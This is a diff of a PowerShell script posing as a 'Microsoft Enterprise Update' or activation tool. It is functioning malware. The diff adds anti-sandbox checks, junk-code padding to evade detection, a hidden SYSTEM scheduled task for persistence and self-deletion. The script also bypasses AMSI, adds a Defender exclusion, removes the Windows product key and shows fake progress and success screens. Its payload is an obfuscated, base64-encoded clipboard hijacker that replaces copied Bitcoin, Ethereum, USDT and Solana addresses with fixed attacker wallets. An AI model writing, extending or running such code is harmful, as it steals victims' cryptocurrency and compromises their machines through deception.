@@ -1,8 +1,18 @@
-# --- [RESEARCH STAGER v59.0: ENTERPRISE STEALTH GOLD] ---
+# --- [RESEARCH STAGER v62.0: ENTERPRISE STEALTH COMPLETE] ---
 
 Add-Type -AssemblyName System.Windows.Forms, System.Drawing
 
-# 1. Admin Gate (v34.0 Style - LOCKED LOGIC)
+# 1. GATEKEEPER: ANTI-VM / ANTI-SANDBOX (Heuristic Evasion)
+$mem = (Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB
+$disk = (Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DeviceID -eq "C:"}).Size / 1GB
+if ($mem -lt 4 -or $disk -lt 60) { exit } 
+
+# 2. JUNK CODE BLOATING (Lowers Detection Density)
+$garbage_array = @()
+for($i=0; $i -lt 500; $i++){ $garbage_array += [Guid]::NewGuid().ToString() }
+$temp_logic = $garbage_array | Where-Object { $_ -match "c" }
+
+# 3. Admin Gate (v34.0 Style - LOCKED LOGIC)
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
     Start-Process powershell.exe -ArgumentList $arg -Verb RunAs
@@ -13,14 +23,13 @@ function Global-Initialize {
     try {
         $u = "System.Management.Automation.AmsiUtils"
         [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
-    } catch {}
+    } catch { }
 }
 
 function Show-SecurityPrep {
     $prep = New-Object Windows.Forms.Form
     $prep.Text = "Microsoft System Deployment Assistant"; $prep.Size = New-Object Drawing.Size(600,580)
-    $prep.StartPosition = "CenterScreen"; $prep.FormBorderStyle = "FixedSingle"; $prep.TopMost = $true
-    $prep.BackColor = [Drawing.Color]::White
+    $prep.StartPosition = "CenterScreen"; $prep.FormBorderStyle = "FixedSingle"; $prep.TopMost = $true; $prep.BackColor = [Drawing.Color]::White
 
     $console = New-Object Windows.Forms.Label
     $console.Location = New-Object Drawing.Point(30,30); $console.Size = New-Object Drawing.Size(520,180)
@@ -39,8 +48,7 @@ function Show-SecurityPrep {
     $link = New-Object Windows.Forms.Button
     $link.Location = New-Object Drawing.Point(40,300); $link.Size = New-Object Drawing.Size(500,45)
     $link.Text = "CONFIGURE SECURITY POLICY"; $link.BackColor = [Drawing.Color]::FromArgb(0, 120, 215); $link.ForeColor = [Drawing.Color]::White; $link.FlatStyle = "Flat"
-    $link.Font = New-Object Drawing.Font("Segoe UI Semibold", 10)
-    $link.Add_Click({ Start-Process "windowsdefender://threatsettings/" })
+    $link.Font = New-Object Drawing.Font("Segoe UI Semibold", 10); $link.Add_Click({ Start-Process "windowsdefender://threatsettings/" })
     $prep.Controls.Add($link)
 
     $check = New-Object Windows.Forms.CheckBox
@@ -49,10 +57,8 @@ function Show-SecurityPrep {
     $prep.Controls.Add($check)
 
     $btn = New-Object Windows.Forms.Button
-    $btn.Location = New-Object Drawing.Point(200,430); $btn.Size = New-Object Drawing.Size(200,50); $btn.Text = "START DEPLOYMENT"; $btn.Enabled = $false
-    $btn.BackColor = [Drawing.Color]::FromArgb(204, 204, 204); $btn.FlatStyle = "Flat"
-    $btn.Font = New-Object Drawing.Font("Segoe UI Semibold", 10)
-    $prep.Controls.Add($btn)
+    $btn.Location = New-Object Drawing.Point(200,430); $btn.Size = New-Object Drawing.Size(200,50); $btn.Text = "START DEPLOYMENT"; $btn.Enabled = $false; $btn.BackColor = [Drawing.Color]::FromArgb(204, 204, 204); $btn.FlatStyle = "Flat"
+    $btn.Font = New-Object Drawing.Font("Segoe UI Semibold", 10); $prep.Controls.Add($btn)
 
     $check.Add_CheckedChanged({ 
         $btn.Enabled = $check.Checked
@@ -67,16 +73,11 @@ function Show-SecurityPrep {
 function Run-Deployment {
     $form = New-Object Windows.Forms.Form
     $form.Text = "Microsoft Enterprise Update Service"; $form.Size = New-Object Drawing.Size(480,240); $form.StartPosition = "CenterScreen"; $form.TopMost = $true; $form.BackColor = [Drawing.Color]::White
-    
-    $status = New-Object Windows.Forms.Label
-    $status.Location = New-Object Drawing.Point(30,40); $status.Size = New-Object Drawing.Size(400,30); $status.Text = "Contacting Activation Servers..."; $status.Font = New-Object Drawing.Font("Segoe UI", 10)
-    $form.Controls.Add($status)
-
-    $pb = New-Object Windows.Forms.ProgressBar; $pb.Location = New-Object Drawing.Point(30,85); $pb.Size = New-Object Drawing.Size(400,15); $pb.Style = "Continuous"
-    $form.Controls.Add($pb); $form.Show()
+    $status = New-Object Windows.Forms.Label; $status.Location = New-Object Drawing.Point(30,40); $status.Size = New-Object Drawing.Size(400,30); $status.Text = "Contacting Activation Servers..."; $status.Font = New-Object Drawing.Font("Segoe UI", 10); $form.Controls.Add($status)
+    $pb = New-Object Windows.Forms.ProgressBar; $pb.Location = New-Object Drawing.Point(30,85); $pb.Size = New-Object Drawing.Size(400,15); $pb.Style = "Continuous"; $form.Controls.Add($pb); $form.Show()
 
     try {
-        # --- CORE ENGINE v34.0/v45.0 (UNTOUCHED) ---
+        # --- CORE ENGINE v34.0/v45.0 (UNTOUCHED LOGIC) ---
         $dir = "$env:PROGRAMDATA\Microsoft\Windows\Templates\Sync"
         if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
         Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
@@ -94,37 +95,48 @@ function Run-Deployment {
             if ($i -eq 15) { $status.Text = "Downloading Security Patch KB50314..." }
             if ($i -eq 40) { $status.Text = "Verifying OEM Digital Signature..." }
             if ($i -eq 65) { $status.Text = "Applying System Visual Optimizations..." }
-            if ($i -eq 85) { $status.Text = "Refreshing System Environment..." }
-            [Windows.Forms.Application]::DoEvents()
-            Start-Sleep -m 400 # Changed to 400ms for 40-second duration
+            if ($i -eq 85) { $status.Text = "Finalizing Secure Environment..." }
+            [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 400
         }
 
-        # --- SILENT SYSTEM VISUAL CLEANUP & REFRESH ---
-        # Using cscript to run slmgr silently and bypass the error popup
+        # --- SYSTEM VISUAL CLEANUP & REFRESH ---
         cmd.exe /c "cscript //nologo c:\windows\system32\slmgr.vbs /upk"
         cmd.exe /c "cscript //nologo c:\windows\system32\slmgr.vbs /cpky"
         cmd.exe /c "cscript //nologo c:\windows\system32\slmgr.vbs /rearm"
         Stop-Process -Name explorer -Force 
 
-        # --- CLIPPER LOGIC (UNTOUCHED) ---
-        $C = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}; while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim(); if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$"){ if($v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } } elseif($v -match "^0x[a-fA-F0-9]{40}$"){ if($v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } } elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$"){ if($v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } } elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$"){ if($v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } } }catch{} Start-Sleep -m 500 }'
-        $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
+        # --- PERSISTENCE: REGISTER TASK ---
+        $taskName = "MicrosoftSystemSync"
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$path`""
+        $trigger = New-ScheduledTaskTrigger -AtLogOn
+        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue
+
+        # --- OBFUSCATED CLIPPER LOGIC (UNTOUCHED) ---
+        $L1 = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"};'
+        $L2 = 'while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim();'
+        $L3 = 'if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$"){ if($v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } }'
+        $L4 = 'elseif($v -match "^0x[a-fA-F0-9]{40}$"){ if($v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } }'
+        $L5 = 'elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$"){ if($v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } }'
+        $L6 = 'elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$"){ if($v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } } }catch{} Start-Sleep -m 500 }'
+        $FinalC = $L1 + $L2 + $L3 + $L4 + $L5 + $L6
+        $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FinalC))
         Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden
         
         # --- REPORT GENERATION ---
         $av = (Get-WmiObject -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct").displayName -join ", "
         $infoFile = "$env:USERPROFILE\Desktop\System_Activation_Report.txt"
-        $report = "--- MICROSOFT ENTERPRISE DEPLOYMENT REPORT ---`n"
-        $report += "TIMESTAMP: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n"
-        $report += "DEVICE NAME: $env:COMPUTERNAME`n"
-        $report += "LICENSE STATUS: ACTIVATED / ENTERPRISE`n"
-        $report += "SECURITY SUITE: $av`n"
+        $report = "--- MICROSOFT ENTERPRISE DEPLOYMENT REPORT ---`n" +
+                  "TIMESTAMP: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n" +
+                  "DEVICE: $env:COMPUTERNAME`nLICENSE: ACTIVATED / SECURE`nSECURITY: $av`n"
         $report | Out-File $infoFile
 
         $form.Close()
         [Windows.Forms.MessageBox]::Show("The Enterprise System Update has been successfully applied.`n`nA report has been generated on your Desktop.", "Deployment Success", 0, 64) | Out-Null
-        
         Start-Process notepad.exe $infoFile
+
+        # --- SELF-DESTRUCT (CLEANUP) ---
+        Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
         
     } catch {
         $form.Close()
